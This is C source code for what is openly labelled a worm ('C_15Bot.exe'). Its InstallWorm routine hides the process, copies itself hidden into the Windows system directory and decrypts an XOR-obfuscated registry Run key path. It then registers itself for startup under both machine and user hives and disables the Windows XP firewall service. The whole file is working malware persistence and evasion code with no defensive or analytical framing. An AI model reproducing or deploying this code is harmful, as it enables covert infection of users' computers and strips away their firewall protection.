#include "includes.h"
#include "externs.h"


const char wormfname[]="\\C_15Bot.exe";
const char regkey[]="C_15";

#define RSP_SIMPLE_SERVICE 1

void InstallWorm()
{
	char installed_worm[MAX_PATH],currentpath[MAX_PATH];
	HKEY hkeyz[2]={HKEY_LOCAL_MACHINE,HKEY_CURRENT_USER},hkey;
	int i=0;
	DWORD Sxiw=sizeof(installed_worm);
	DWORD disable_val=4,SizeOf_disable_val=sizeof(DWORD);
	HMODULE hk32;

unsigned char encrypted_start_key[45] =
{
    0xBC, 0x80, 0x89, 0x9B, 0x98, 0x8E, 0x9D, 0x8A,
	0xB3, 0xA2, 0x86, 0x8C, 0x9D, 0x80, 0x9C, 0x80, 
    0x89, 0x9B, 0xB3, 0xB8, 0x86, 0x81, 0x8B, 0x80,
	0x98, 0x9C, 0xB3, 0xAC, 0x9A, 0x9D, 0x9D, 0x8A, 
    0x81, 0x9B, 0xB9, 0x8A, 0x9D, 0x9C, 0x86, 0x80,
	0x81, 0xB3, 0xBD, 0x9A, 0x81,
} ;	// x0r 0xEF encrypted : Software\Microsoft\Windows\CurrentVersion\Run


	hk32=GetModuleHandle("kernel32.dll");

	if(hk32!=NULL)
	{
		if(GetProcAddress(hk32,"RegisterServiceProcess")!=NULL)
		{
			__asm
			{
				push	RSP_SIMPLE_SERVICE
				push	0
				call	eax	//hide the worm under Windows 9x/me
			}
		}
	}

	GetModuleFileName(NULL,currentpath,MAX_PATH);	//where we are ?

	GetSystemDirectory(installed_worm,MAX_PATH);	//get sysdir

	lstrcat(installed_worm,wormfname);

	CopyFile(currentpath,installed_worm,FALSE);		//copy worm

	SetFileAttributes(installed_worm,FILE_ATTRIBUTE_HIDDEN);	//hide it

	for(i=0;i<sizeof(encrypted_start_key);i++)
		encrypted_start_key[i]^=0xEF;		//decrypt startup key

	encrypted_start_key[i]=NULL;

	for(i=0;i<2;i++)	//add to start up
	{
		if(RegOpenKeyEx(hkeyz[i],(const char *)encrypted_start_key,0,KEY_WRITE,&hkey)==ERROR_SUCCESS)
		{
			RegSetValueEx(hkey,regkey,0,REG_SZ,(BYTE *)installed_worm,Sxiw);
			RegCloseKey(hkey);
		}
	}
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,	//disable winXP firewall
		"SYSTEM\\CurrentControlSet\\Services\\SharedAccess",0,KEY_WRITE,&hkey)==ERROR_SUCCESS)
	{
		RegSetValueEx(hkey,"Start",0,REG_DWORD,(BYTE *)&disable_val,SizeOf_disable_val);
		RegCloseKey(hkey);
	}

}